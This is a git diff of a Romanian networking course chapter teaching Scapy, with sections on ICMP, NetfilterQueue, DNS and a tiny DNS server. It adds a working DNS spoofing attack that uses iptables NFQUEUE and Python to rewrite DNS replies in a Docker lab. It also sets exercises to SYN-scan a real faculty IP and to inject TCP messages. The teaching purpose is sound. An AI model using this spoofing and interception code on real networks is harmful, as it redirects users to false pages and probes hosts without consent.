@@ -27,9 +27,9 @@
   - [Ethernet Object in Scapy](#ether_scapy)
 - [Address Resolution Protocol](#arp)
   - [ARP in Scapy](#arp_scapy)
-- [Scapy Tutorial](#scapy)
-  - [Exemplu ICMP ping](#scapy_ping)
-  - [Exemplu DNS](#scapy_dns)
+- [Exemple de protocoale în Scapy](#scapy)
+  - [Internet Control Message Protocol (ICMP)](#scapy_icmp)
+  - [Domain Name System (DNS)](#scapy_dns)
 - [Exerciții](#exercitii)
 
 <a name="intro"></a> 
@@ -1063,7 +1063,7 @@ else:
 
 
 <a name="scapy"></a> 
-## [Tutorial Scapy](https://scapy.readthedocs.io/en/latest/usage.html#starting-scapy)
+## [Exemple de protocoale în Scapy](https://scapy.readthedocs.io/en/latest/usage.html#starting-scapy)
 
 Funcția `sniff()` ne permite să captăm pachete în cod cum am face cu wireshark sau tcpdump. De asemenea putem salva captura de pachete în format .pcap cu tcpdump: 
 ```bash
@@ -1130,8 +1130,11 @@ Pentru a trimite pachete la nivelul legatură de date, completând manual câmpu
 - `answer = srp1()` - send_receive_1_ethernet la fel ca srp, dar înregistreazî doar primul răspuns
 
 
-<a name="scapy_ping"></a> 
-### Exemplu ping
+<a name="scapy_icmp"></a> 
+### Internet Control Message Protocol (ICMP)
+
+Am discutat despre ICMP și ping pentru a verifica dacă două device-uri pot comunica unul cu altul. Principala funcție a protocolului ICMP este de [a raprota erori](https://www.cloudflare.com/learning/ddos/glossary/internet-control-message-protocol-icmp/) iar [mesajele de control](https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol#Control_messages) pot varia de la faptul că un host, port sau protocol este inaccesibil până la notificarea că TTL a expirat în tranzit.
+
 ```python
 ICMP().show()
 ###[ ICMP ]### 
@@ -1141,9 +1144,12 @@ ICMP().show()
   id= 0x0
   seq= 0x0
 
+# facem un pachet echo-request, ping
 icmp = ICMP(type = 'echo-request')
 ip = IP(dst = "137.254.16.101")
 pachet = ip / icmp
+
+# folosim sr1 pentru send și un reply
 rec = sr1(pachet)
 rec.show()
 
@@ -1169,59 +1175,264 @@ rec.show()
      seq= 0x0
 ```
 
-<a name="scapy_dns"></a> 
-### Exemplu DNS request
-Mai jos aveți un exemplu de cerere DNS:
+<a name="scapy_nfqueue"></a> 
+### Netfilter Queue
+Pentru a modifica pachetele care circulă live pe rețeaua noastră, putem folosi librăria [NetfilterQueue](https://netfilter.org/projects/libnetfilter_queue/) care stochează pachetele într-o coadă. La citirea din coadă, pachetele pot fi acceptate (`packet.accept()`) pentru a fi transmise mai departe sau pot fi blocate (`packet.drop()`), în cazul în care dorim să blocăm anumite tipuri de pachete. Mai multe exemple [în extensia de python](https://pypi.org/project/NetfilterQueue/).
+Pentur a folosi librăria, trebuie să adăugăm o regulă în firewall-ul iptables prin care să redirecționăm toate pachetele către o coadă NETFILTERQUEUE cu un id specific. Acest lucru se poate face din shell:
+```bash
+# toate pachetele de la input se redirectioneaza catre coada 5
+iptables -I INPUT -j NFQUEUE --queue-num 5
+```
+sau din python:
 ```python
+import os
+os.system("iptables -I INPUT -j NFQUEUE --queue-num 5")
+```
+
+
+#### Blocarea IP-ului 198.10.1.1
+Ne atașăm containerului server:
+```bash
+docker-compose exec server bash
+```
+
+Dintr-un terminal de python sau dintr-un fișier rulăm:
+
+```python
+from scapy.all import *
+from netfilterqueue import NetfilterQueue as NFQ
+import os
+def proceseaza(pachet):
+    # octeti raw, ca dintr-un raw socket
+    octeti = pachet.get_payload()
+    # convertim octetii in pachet scapy
+    scapy_packet = IP(octeti)
+    scapy_packet.summary()
+    if scapy_packet[IP].src == '198.10.0.2':
+        print("Drop la: ", scapy_packet.summary())
+        pachet.drop()
+    else:
+        print("Accept la: ", scapy_packet.summary())
+        pachet.accept()
+
+queue = NFQ()
+try:
+    os.system("iptables -I INPUT -j NFQUEUE --queue-num 5")
+    # bind trebuie să folosească aceiași coadă ca cea definită în iptables
+    queue.bind(5, proceseaza)
+    queue.run()
+except KeyboardInterrupt:
+    queue.unbind()
+```
+
+
+<a name="scapy_dns"></a> 
+### Domain Name System
+
+Aici puteți găsi ilustrate informații despre [DNS și DNS over HTTPS](https://hacks.mozilla.org/2018/05/a-cartoon-intro-to-dns-over-https/).
+În linux există aplicația `dig` cu care putem interoga entries de DNS:
+```bash
+# interogam serverul 8.8.8.8 pentur a afla la ce IP este fmi.unibuc.ro
+dig @8.8.8.8 fmi.unibuc.ro
+
+; <<>> DiG 9.10.3-P4-Ubuntu <<>> @8.8.8.8 fmi.unibuc.ro
+; (1 server found)
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 16808
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 512
+;; QUESTION SECTION:
+;fmi.unibuc.ro.         IN  A
+
+;; ANSWER SECTION:
+fmi.unibuc.ro.      12925   IN  A   193.226.51.15
+
+;; Query time: 39 msec
+;; SERVER: 8.8.8.8#53(8.8.8.8)
+;; WHEN: Wed May 13 13:29:13 EEST 2020
+;; MSG SIZE  rcvd: 58
+
+```
+DNS stochează nu doar informații despre IP-ul corespunzător unui hostname, ci există mai multe tipuri de intrări ([record types](https://ns1.com/resources/dns-types-records-servers-and-queries)) în baza de date:
+
+- A record / Address Mapping - stochează perechi de NUME - IPv4
+- AAAA Record - similar cu A, pentru adrese IPv6
+- CNAME / Canonical Name - are rolul de a face un alias între un hostname existent și un alt hostname, ex: nlp.unibuc.ro -> nlp-unibuc.github.io
+- MX / Mail Exchanger - spcifică server de email SMTP pentru domeniu, încercați `dig @8.8.8.8 fmi.unibuc.ro MX`
+- NS / Name Server - specifică ce Authoritative Name Server este responabil pentru o anumită zonă de DNS (ex., pentru fmi.unibuc.ro este ns1.fmi.unibuc.ro), încercați `dig @8.8.8.8 fmi.unibuc.ro NS`
+- PTR / Reverse-lookup Pointer - permite interogarea in functie de IP pentru a afla numele
+- TXT / Text data - conține informații care pot fi procesate de alte servicii, `dig @8.8.8.8 fmi.unibuc.ro TXT`
+- SOA / Start of Authority - conține informații despre autoritatea care se ocupă de acest nume
+
+Protocolul pentru DNS lucrează la nivelul aplicației și este standardizat pentru UDP, port 53. Acesta se bazează pe request-response iar în cazul în care nu se primesc răspunsuri după un număr de reîncercări (de multe ori 2), programul anunță că nu poate găsi IP-ul pentru hostname-ul cerut ("can'r resolve"). Headerul protocolului [este definit aici](http://www.networksorcery.com/enp/protocol/dns.htm).
+
+#### Exemplu DNS request
+```python
+from scapy.all import *
+
+# DNS request către google DNS
 ip = IP(dst = '8.8.8.8')
 transport = UDP(dport = 53)
 
+# rd = 1 cod de request
 dns = DNS(rd = 1)
-dns_query = DNSQR(qname = 'fmi.unibuc.ro')
+
+# query pentru a afla entry de tipul 
+dns_query = DNSQR(qname=b'fmi.unibuc.ro.', qtype=1, qclass=1)
 dns.qd = dns_query
 
 answer = sr1(ip / transport / dns)
 print (answer[DNS].summary())
 ```
 
-#### DNS spoofing
-Putem seta DNS-ul nostru (pe linux, în fișierul `/etc/resolv.conf` sau ca în [exemplul de aici](https://unix.stackexchange.com/questions/128220/how-do-i-set-my-dns-when-resolv-conf-is-being-overwritten)), atunci putem trimite răspunsuri tip DNS false dacă intermediem conexiunea unui device:
-
+#### Micro DNS
+Putem scrie un mic exemplu de aplicație care să funcționeze ca DNS care returnează [DNS A records](https://support.dnsimple.com/articles/a-record/). DNS rulează ca UDP pe portul 53:
 ```python
-# este necesar să rezervăm portul acesta în cazul în care noi suntem DNS
-# pentru a nu trimite sistemul de operare ICMP Destination Port Unreachable
-s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, proto=socket.IPPROTO_UDP)
-s.bind(('0.0.0.0', 53))
-def spoof_dns(packet):
-    ip = packet.getlayer(IP)
-    udp = packet.getlayer(UDP)
-    dnsqr = packet.getlayer(DNSQR)
-    # daca pachetul are IP/UDP/DNS/DNSQR
-    if dnsqr is not None and ip is not None and udp is not None:
-        print(packet.__str__)
-        if 'unibuc' in dnsqr.qname.decode('utf-8'):
-            # sursa este destinatia si vice-versa
-            ip_response = IP(src=ip.dst, dst=ip.src)
-            udp_response = UDP(sport=udp.dport, dport=udp.sport)
-            dns_answer = DNSRR(
-                rrname=dnsqr.qname, ttl=330, type="A", rclass="IN", rdata='1.1.1.1')
-            dns_response = DNS(id = packet[DNS].id, qr = 1, aa = 0, rcode = 0, qd = packet.qd, an = dns_answer)
-            print (dns_response.__str__)
-            send(ip_response / udp_response / dns_response)
-# alegem interfata pe care sa trimite, eth1 in cazul routerului
-sniff(prn=spoof_dns, iface='eth1')
-# daca suntem intermediar, ar trebui sa oprim orice alte raspunsuri
-# de la DNS-ul public folosind o regula de iptables:
-# iptables -I INPUT -p udp --sport 53 -j DROP
+import socket
+import select
+from scapy.all import *
+
+raw_udp = socket.socket(socket.AF_INET, socket.SOCK_RAW, proto=socket.IPPROTO_UDP)
+raw_udp.bind(('0.0.0.0', 53))
+# dummy socket to keep the port busy:  https://stackoverflow.com/a/9969618
+simple_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, proto=socket.IPPROTO_UDP)
+simple_udp.bind(('0.0.0.0', 53))
+
+
+while True:
+    #responses, _, _ = select.select([raw_udp, simple_udp], [], [])
+    # citeste doar din RAW UDP
+    request, adresa_sursa = raw_udp.recvfrom(65535)
+    # converitm octetii in pachet scapy
+    packet = IP(request)
+    dns = packet.getlayer(DNS)
+    if dns.opcode == 0: # dns QUERY
+        '''
+            qname= 'fmi.unibuc.ro.'
+            qtype= A
+            qclass= IN
+        '''
+        print ("got: ")
+        print (packet.show())
+        if dns.qd.qname == b'fmi.unibuc.ro.':
+               ip = packet.getlayer(IP)
+               udp = packet.getlayer(UDP)
+               ip_response = IP(src=ip.dst, dst=ip.src)
+               udp_response = UDP(sport=udp.dport, dport=udp.sport)
+               dns_answer = DNSRR(      # DNS Reply
+                   rrname=dns.qd.qname, # for question
+                   ttl=330,             # DNS entry Time to Live
+                   type="A",            
+                   rclass="IN",
+                   rdata='1.1.1.1')     # found at IP: 1.1.1.1 :)
+               dns_response = DNS(
+                                  id = packet[DNS].id, # DNS replies must have the same ID as requests
+                                  qr = 1,              # 1 for response, 0 for query 
+                                  aa = 0,              # Authoritative Answer
+                                  rcode = 0,           # 0, nicio eroarehttp://www.networksorcery.com/enp/protocol/dns.htm#Rcode,%20Return%20code
+                                  qd = packet.qd,      # request-ul original
+                                  an = dns_answer)     # obiectul de reply
+               print('response:')
+               response =  udp_response / dns_response
+               print (response.__str__)
+               raw_udp.sendto(bytes(response), adresa_sursa)
+raw_udp.close()
+simple_udp.close()
 ```
+
+
+
+
+#### DNS Spoofing
+Dacă intermediem conexiunea între două noduri, putem insera răspunsuri DNS malițioase cu scopul de a determina userii să acceseze pagini false. Pe linux, un DNS customizabil se poate set prin fișierul `/etc/resolv.conf` sau ca în [exemplul de aici](https://unix.stackexchange.com/questions/128220/how-do-i-set-my-dns-when-resolv-conf-is-being-overwritten)).
+
+Presupunem că folosim configurația de containere definită în acest capitol, că ne aflăm pe containerul `router` și că monitorizăm toate cererile containerul `server`. În cazul în care observăm un pachet UDP cu portul destinație 53 (e.g., IP destinație 8.8.8.8), putem încerca să trimitem un reply care să pară că vine de la DNS (8.8.8.8) cu o adresă IP falsă care nu apraține numelui interogat de către server. 
+E posibil ca reply-ul nostru să ajungă la containerul `server`, dar și reply-ul serverul DNS original (8.8.8.8) să ajungă tot la container. Pentru ca atacul să fie cât mai lin, cel mai sigur este să modificăm live răspunsurile DNS-ului original (8.8.8.8) după următoarele instrucțiuni ([sursa originală](https://www.thepythoncode.com/article/make-dns-spoof-python)):
+
+##### 1. iptables forward către nfqueue
+Ne atașăm containerului `router` pentru a ataca containerul `server`. Construim o regulă de iptables prin care toate pachetele care trebuie forwardate (-I FORWARD) să treacă prin regula NFQUEUE cu număr de identificare 10 (putem alege orice număr).
+```bash
+docker-compose exec router bash
+
+iptables -I FORWARD -j NFQUEUE --queue-num 10
+```
+##### 2. Scriem o funcție care detectează și modifică pachete de tip DNS reply
+Deschidem un terminal de python sau scriem codul într-un fișier pe care îl executăm:
+```python
+from scapy.all import *
+from netfilterqueue import NetfilterQueue as NFQ
+import os
+
+def detect_and_alter_packet(packet):
+    """
+    Whenever a new packet is redirected to the netfilter queue,
+    this callback is called.
+    """
+    octets = packet.get_payload()
+    scapy_packet = IP(octets)
+    # if the packet is a DNS Resource Record (DNS reply)
+    # modify the packet
+    if scapy_packet.haslayer(IP) and \
+       scapy_packet.haslayer(UDP) and \ 
+       scapy_packet.haslayer(DNSRR):
+        print("[Before]:", scapy_packet.summary())
+        scapy_packet = alter_packet(scapy_packet)
+        print("[After ]:", scapy_packet.summary())
+
+        # put it back in the queue in the form of octets
+        packet.set_payload(bytes(scapy_packet))
+    # accept the packet in the queue
+    packet.accept()
+
+
+def alter_packet(packet):
+    # get the DNS question name, the domain name
+    qname = packet[DNSQR].qname
+    # daca nu e site-ul fmi, returnam fara modificari
+    if qname != b'fmi.unibuc.ro':
+        return packet
+
+    # construim un nou raspuns cu rdata
+    packet[DNS].an = DNSRR(rrname=qname, rdata='1.1.1.1')
+    # set the answer count to 1
+    packet[DNS].ancount = 1
+
+    # delete checksums and length of packet, because we have modified the packet
+    # new calculations are required ( scapy will do automatically )
+    del packet[IP].len
+    del packet[IP].chksum
+    del packet[UDP].len
+    del packet[UDP].chksum
+    # return the modified packet
+    return packet
+
+
+```
+
+##### 3. Executăm coada Netfilter cu funcția definită anterior
+```python
+queue = NFQ()
+queue.bind(10, detect_and_alter_packet)
+queue.run()
+queue.unbind()
+```
+
+
 
 
 <a name="exercitii"></a> 
 ## Exerciții
-1. Folosiți exemplul de mai sus pentru a trimite mesaje între serverul pe UDP și scapy.
-2. Rulați 3-way handshake între server și client folosind containerele definite în capitolul3, astfel: containerul server va rula capitolul2/tcp_server.py pe adresa '0.0.0.0', iar în containerul client rulați scapy (puteți folosi comanda: `docker-compose exec --user root mid1 scapy`) și configurați fișierul din [capitolul3/src/tcp_handshake.py](https://github.com/senisioi/computer-networks/blob/2020/capitolul3/src/tcp_handshake.py) pentru a face 3-way handshake.
+1. Instanțiați un server UDP și faceți schimb de mesaje cu un client scapy.
+2. Rulați 3-way handshake între server și client folosind containerele definite în capitolul3, astfel: containerul `server` va rula `capitolul2/tcp_server.py` pe adresa '0.0.0.0', iar în containerul `client` configurați și rulați fișierul din [capitolul3/src/tcp_handshake.py](https://github.com/senisioi/computer-networks/blob/2020/capitolul3/src/tcp_handshake.py) pentru a face 3-way handshake.
 3. Configurați opțiunea pentru Maximum Segment Size (MSS) astfel încat să îl notificați pe server că segmentul maxim este de 1 byte. Puteți să-l configurați cu 0?
-4. Trimiteți un mesaj serverului folosind flag-ul PSH.
+4. Trimiteți mesaje TCP folosind flag-ul PSH și scapy.
 5. Setați flag-urile ECN în IP și flag-ul ECE in TCP pentru a notifica serverul de congestionarea rețelei.
 6. [TCP Syn Scanning](https://scapy.readthedocs.io/en/latest/usage.html#syn-scans) - folosiți scapy pentru a crea un pachet cu IP-ul destinație 193.226.51.6 (site-ul facultății) și un layer de TCP cu dport=(10, 500) pentru a afla care porturi sunt deschise comunicării cu TCP pe site-ul facultății.
 7. Urmăriți mai multe exemple din scapy [aici](https://scapy.readthedocs.io/en/latest/usage.html#simple-one-liners)
+8. Utilizați NetfilterQueue în containerul `router` pentru a intercepta pachete TCP dintre client și server și pentru a injecta mesaje suplimentare în comunicare.
+
+
+
